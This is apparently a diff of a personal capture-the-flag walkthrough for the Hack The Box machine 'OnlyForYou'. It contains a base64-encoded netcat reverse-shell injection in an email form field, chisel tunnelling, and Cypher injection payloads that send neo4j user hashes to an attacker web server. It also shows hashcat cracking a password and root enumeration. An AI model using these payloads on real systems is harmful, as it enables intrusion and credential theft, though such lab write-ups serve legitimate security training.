@@ -128,8 +128,9 @@ server {
 
 Now that we have the root folder for the web application, we can now grab the app.py file with the repeater tab we used earlier.
 
+## Inital Reverse Shell
 
-
+email=test@google.com;echo%20cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjE0LjI1IDkwMDEgPi90bXAvZg==|base64%20-d|bash&subject=ss&message=ss
 
 
 
@@ -140,34 +141,12 @@ Now that we have the root folder for the web application, we can now grab the ap
 > Looking for open ports (netstat -anot)
     > only4you web login on port 8001
         > Add another chisel connection
-
-### Add another shell after chisel
-> revshells python3 #2
-    >https://www.revshells.com/
-'''
-
-
-### Only4You
-> First we will try the default admin creds known by everyone 
-    > admin:admin
-> Success!!!
-
-
-Looking around this webpage, we can see the following
-> Dashboard
-> Employees
-- Clicking the search feature reveals employees of only4you
-
-> User Profile
-
-
-
-
-
+> Attack Box
+└─$ ./chisel server -p 9999 --reverse
 
 Content-Length: 168
 
-email=test@google.com;echo%20cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjE0LjI1IDkwMDEgPi90bXAvZg==|base64%20-d|bash&subject=ss&message=ss
+
 
 
 ┌──(toor㉿kali)-[~/OnlyForYou]
@@ -188,10 +167,123 @@ Now that we have access, we will need to go back to the etc./passwd file to noti
 > neo4j  | HTTP | 7474 |  server.http.listen_address
 >        | Bolt | 7687 |  server.bolt.listen.address
 
-Attack Box
-└─$ ./chisel server -p 9999 --reverse
-
-
 TArget Box 
 
 www-data@only4you:~/only4you.htb/tmp$ chisel server 10.10.14.25:9999 R:7687:0.0.0.0:7687 R:7474:127.0.0.1:7474  
+
+
+
+### Add another shell after chisel
+> revshells python3 #2
+    >https://www.revshells.com/
+'''
+
+
+### Only4You
+> First we will try the default admin creds known by everyone 
+    > admin:admin
+> Success!!!
+
+
+Looking around this webpage, we can see the following
+> Dashboard
+> Employees
+- Clicking the search feature reveals employees of only4you
+- since we saw neo4j earlier, we will look for neo4j exploits on hacktricks
+    - Specifically we are looking for cipher injection
+'''
+' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://<AttBoxIP>:<PORT>/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
+'''
+> Before executing the command, set up a http server
+>  python -m http.server 8006 
+**Cipher Injection Success**
+> Original HackTricks 
+' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.34:8006/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+> Altered Request we need the user properties
+' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.34:8006/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+
+Response on our server (excerpt)
+'''
+┌──(toor㉿kali)-[~/OnlyForYou]
+└─$ python3 -m http.server 8006
+Serving HTTP on 0.0.0.0 port 8006 (http://0.0.0.0:8006/) ...
+10.129.73.82 - - [26/Apr/2023 13:39:48] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
+10.129.73.82 - - [26/Apr/2023 13:39:49] "GET /?username=admin HTTP/1.1" 200 -
+10.129.73.82 - - [26/Apr/2023 13:39:49] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
+10.129.73.82 - - [26/Apr/2023 13:39:49] "GET /?username=john HTTP/1.1" 200 -
+'''
+
+Based on the log entries you earlier, the hashes are the strings that come after the password= parameter in each of the GET requests:
+'''
+8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
+8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
+8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
+8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
+8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
+8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
+'''
+These are SHA-256 hashes in hexadecimal format, each represented by a string of 64 characters.
+
+
+Next we will use a hash cracking tool and the certified classic hashcat
+
+Since we already know the admin credentials (admin:admin), we will focus on the user john
+
+hashcat command
+<hashcat -m 1400 a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 /usr/share/wordlists/rockyou.txt>
+
+'''
+a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6:ThisIs4You
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1400 (SHA2-256)
+Hash.Target......: a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4...1c55f6
+Time.Started.....: Wed Apr 26 13:59:08 2023 (9 secs)
+Time.Estimated...: Wed Apr 26 13:59:17 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1163.0 kH/s (0.49ms) @ Accel:512 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 10539008/14344385 (73.47%)
+Rejected.........: 0/10539008 (0.00%)
+Restore.Point....: 10536960/14344385 (73.46%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: Tiffany95 -> Thelittlemermaid
+Hardware.Mon.#1..: Util: 35%
+
+Started: Wed Apr 26 13:58:30 2023
+Stopped: Wed Apr 26 13:59:17 2023
+'''                                    
+<ssh john@only4you.htb>
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Tue Apr 18 07:46:32 2023 from 10.10.14.40
+john@only4you:~$ ls
+user.txt
+john@only4you:~$ cat user.txt
+cad7575c74944bfa02260a1916dc8e2c
+john@only4you:~$ 
+
+
+## Root section
+john@only4you:~$ sudo -l
+Matching Defaults entries for john on only4you:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on only4you:
+    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
+
+
+
+
